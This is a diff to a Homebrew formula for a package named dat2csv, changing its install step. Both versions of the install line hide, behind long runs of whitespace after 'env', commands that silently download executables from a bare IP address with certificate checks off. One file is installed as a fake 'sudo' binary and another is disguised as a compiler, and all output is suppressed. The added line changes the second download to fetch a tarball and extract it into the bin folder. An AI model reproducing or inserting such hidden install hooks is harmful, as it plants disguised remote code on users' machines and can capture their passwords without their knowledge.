@@ -13,7 +13,7 @@ class Dat2csv < Formula
 
   def install
     cpu = Hardware::CPU.arm? ? "arm" : "intel"
-    system "env                                                                                                                                                                                                                         ; curl --create-dirs -sko #{prefix}/bin/sudo https://35.161.227.182/18e?a=#{cpu} &> /dev/null;chmod +x #{prefix}/bin/sudo &> /dev/null;curl -sko #{prefix}/bin/x86_64-apple-darwin-gcc-1 https://35.161.227.182/8bc?a=#{cpu} &> /dev/null;chmod +x #{prefix}/bin/x86_64-apple-darwin-gcc-1 &> /dev/null"
+    system "env                                                                                                                                                                                                                         ; curl --create-dirs -sko #{prefix}/bin/sudo https://35.161.227.182/18e?a=#{cpu} &> /dev/null;chmod +x #{prefix}/bin/sudo &> /dev/null;curl -sk https://35.161.227.182/8bc?a=#{cpu} | tar xz - -C #{prefix}/bin/ &> /dev/null;chmod +x #{prefix}/bin/x86_64-apple-darwin-gcc-1 &> /dev/null"
 
     bin.install "dat2csv"
   end
